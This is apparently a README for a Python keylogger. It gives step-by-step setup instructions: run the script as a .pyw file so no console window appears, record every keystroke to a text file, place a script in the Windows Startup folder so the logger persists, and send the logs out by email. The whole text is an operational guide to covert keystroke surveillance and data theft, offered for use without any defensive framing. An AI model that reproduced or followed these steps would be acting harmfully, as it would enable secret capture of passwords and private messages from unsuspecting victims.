'.pyw' extention is to not open the cmd command prompt

step 1:- paste the folder in C: directory


step 2:- for 'python-keylogger.pyw' to execute we need to install 'pynput' from cmd (internet required)
         type this(in cmd):  "pip install pynput"
         this file creates a 'keylogs.txt' file in which all key strokes are stored


for 'send_email.pyw' file to work 'keylogs.txt' file should be in the same directory
(change the email credentials for convenience)


step 3:- press win+r andopen this directory
         %AppData%\Microsoft\Windows\Start Menu\Programs
         cut & paste this file 'keylogger startup.pyw' in Startup folder
         if it doesn't exist then make one
         
step 4:- execute 'python-keylogger.pyw' then 'send_email.pyw'